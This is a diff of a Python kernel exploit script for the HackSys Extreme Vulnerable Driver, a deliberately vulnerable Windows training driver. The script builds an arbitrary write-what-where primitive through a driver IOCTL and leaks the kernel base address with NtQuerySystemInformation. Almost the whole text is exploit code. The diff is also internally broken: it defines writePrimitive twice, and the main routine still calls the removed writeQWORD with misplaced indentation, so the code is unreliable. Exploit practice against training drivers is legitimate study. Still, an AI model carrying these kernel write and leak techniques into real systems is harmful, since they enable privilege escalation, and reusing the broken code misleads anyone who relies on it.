@@ -31,8 +31,7 @@ PAGE_EXECUTE_READWRITE = 0x00000040
 PAGE_READWRITE = 0x00000004
 ThreadBasicInformation = 0
 
-# Windows API Function Defs + Extras
-
+###################################################### DEFINITIONS ##########################################################
 ntdll.NtAllocateVirtualMemory.argtypes = [
     c_ulonglong,
     POINTER(c_ulonglong),
@@ -54,8 +53,6 @@ kernel32.DeviceIoControl.argtypes = [
     c_void_p,
     ]
 
-# Added more definitions - read memory and also an API call for process information
-
 kernel32.ReadProcessMemory.argtypes = [c_void_p, c_void_p, c_void_p,
         c_size_t, POINTER(c_size_t)]
 ntdll.NtQueryInformationThread.argtypes = [c_void_p, c_ulonglong,
@@ -64,16 +61,8 @@ STATUS_SUCCESS = 0
 written = c_size_t()
 read = c_size_t()
 
-# Allocate memory to use for the HEVD Leak
-# Easy to recognize arbitrary address
-
 baseadd = c_ulonglong(0x000000001a000000)
-
-# Some size
-
 addsize = c_ulonglong(0x3000)
-
-# The win32con may be fucked up, but I saw this in another exploit's source code using this same library I think it's ok.
 
 dwStatus = ntdll.NtAllocateVirtualMemory(
     0xFFFFFFFFFFFFFFFF,
@@ -90,54 +79,38 @@ if dwStatus != STATUS_SUCCESS:
     print ('Something went wrong while allocating memory', 'e')
     sys.exit()
 
-
-def writeQWORD(driver, what=None, where=None):
-    what_addr = 0x000000001a001000  # Arbitrary offset inside baseadd
-
+################################################### WRITE ###########################################################
+def writePrimitive(driver, what=None, where=None):
+    what_addr = 0x000000001a001000
     # Write the what value to what_addr
-
     data = struct.pack('<Q', what)
     dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF,
             what_addr, data, len(data), byref(written))
-
+    
     if dwStatus == 0:
         print ('Something went wrong while writing to memory', 'e')
         sys.exit()
-
-    # Pack the address of the what value and the where address
-
+        
     data = struct.pack('<Q', what_addr) + struct.pack('<Q', where)
     dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF,
             0x000000001a000000, data, len(data), byref(written))
+    
     if dwStatus == 0:
         print ('Something went wrong while writing to memory in the packing section'
                , 'e')
         sys.exit()
-
-    # IOCTL
-
+        
     IoControlCode = 0x0022200B
-
-    # Where
-
     InputBuffer = c_void_p(0x000000001a000000)
-
-    # I THINK this should work?
-
-    InputBufferLength = 0x10  # can't take length of a void pointer len(InputBuffer)
-
-    # If our buffer length is zero can't we set OutputBuffer to None?
-
+    InputBufferLength = 0x10
     OutputBuffer = c_void_p(0)
-
-    # The OutputBufferLength is already set to zero. I think we can get rid of this?
-
     OutputBufferLength = 0
     dwBytesReturned = c_ulong()
     lpBytesReturned = byref(dwBytesReturned)
-
+    
     print 'Value before DeviceIoControl: %08x' \
         % cast(0x000000001a002000, POINTER(c_ulonglong))[0]
+    
     triggerIOCTL = kernel32.DeviceIoControl(
         driver,
         IoControlCode,
@@ -148,15 +121,59 @@ def writeQWORD(driver, what=None, where=None):
         lpBytesReturned,
         NULL,
         )
+    
     print 'Value after: %08x' % cast(0x000000001a002000,
             POINTER(c_ulonglong))[0]
     return triggerIOCTL
 
-
-def readQWORD(driver_handle, what=None, where=None):
-
-    # token finding code here
-
+################################################### WRITE ###########################################################
+def writePrimitive(driver, what=None, where=None):
+    what_addr = 0x000000001a001000
+    # Write the what value to what_addr
+    data = struct.pack('<Q', what)
+    dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF,
+            what_addr, data, len(data), byref(written))
+    
+    if dwStatus == 0:
+        print ('Something went wrong while writing to memory', 'e')
+        sys.exit()
+        
+    data = struct.pack('<Q', what_addr) + struct.pack('<Q', where)
+    dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF,
+            0x000000001a000000, data, len(data), byref(written))
+    
+    if dwStatus == 0:
+        print ('Something went wrong while writing to memory in the packing section'
+               , 'e')
+        sys.exit()
+        
+    IoControlCode = 0x0022200B
+    InputBuffer = c_void_p(0x000000001a000000)
+    InputBufferLength = 0x10
+    OutputBuffer = c_void_p(0)
+    OutputBufferLength = 0
+    dwBytesReturned = c_ulong()
+    lpBytesReturned = byref(dwBytesReturned)
+    
+    print 'Value before DeviceIoControl: %08x' \
+        % cast(0x000000001a002000, POINTER(c_ulonglong))[0]
+    
+    triggerIOCTL = kernel32.DeviceIoControl(
+        driver,
+        IoControlCode,
+        InputBuffer,
+        InputBufferLength,
+        OutputBuffer,
+        OutputBufferLength,
+        lpBytesReturned,
+        NULL,
+        )
+    
+    print 'Value after: %08x' % cast(0x000000001a002000,
+            POINTER(c_ulonglong))[0]
+    return triggerIOCTL
+########################################## KERNEL BASE ################################################
+def getkernelBase(driver_handle, what=None, where=None):
     print '[*] Calling NtQuerySystemInformation w/SystemModuleInformation'
     sys_info = create_string_buffer(0)
     sys_info_len = c_ulong(0)
@@ -174,7 +191,6 @@ def readQWORD(driver_handle, what=None, where=None):
 
         print '[!] NtQuerySystemInformation failed with NTSTATUS: {}'.format(hex(result))
 
-
     class SYSTEM_MODULE_INFORMATION(Structure):
 
         _fields_ = [
@@ -189,14 +205,11 @@ def readQWORD(driver_handle, what=None, where=None):
             ('ImageName', c_char * 256),
             ]
 
-    # thanks GradiusX
-
     handle_num = c_ulong(0)
     handle_num_str = create_string_buffer(sys_info.raw[:8])
     memmove(addressof(handle_num), handle_num_str, sizeof(handle_num))
 
     print '[*] Result buffer contains {} SystemModuleInformation objects'.format(str(handle_num.value))
-
     sys_info = create_string_buffer(sys_info.raw[8:])
 
     counter = 0
@@ -210,14 +223,10 @@ def readQWORD(driver_handle, what=None, where=None):
             print '[*] Kernel Type: {}'.format(img_name)
             kernel_base = hex(tmp.ImageBase)[:-0x01]
             print '[*] Kernel Base: {}'.format(kernel_base)
-
+            
             return (img_name, kernel_base)
-
     counter += sizeof(tmp)
-
-
-# Exploit the driver
-
+########################################### MAIN ##############################################
 def executeOverwrite():
     driver_handle = kernel32.CreateFileA(
         '\\\\.\\HackSysExtremeVulnerableDriver',
@@ -234,12 +243,9 @@ def executeOverwrite():
     else:
         print '[X] Got handle to the driver.\n'
 
-    # This will not run until leakQWORD() definition problem is resolved.
-        # readKernelValue()
-
         writeQWORD(driver_handle, 0x4142434445464748,
                    0x000000001a002000)
-        readQWORD(driver_handle)
+        getkernelBase(driver_handle)
 
-
+############################################ RUN ################################################
 executeOverwrite()
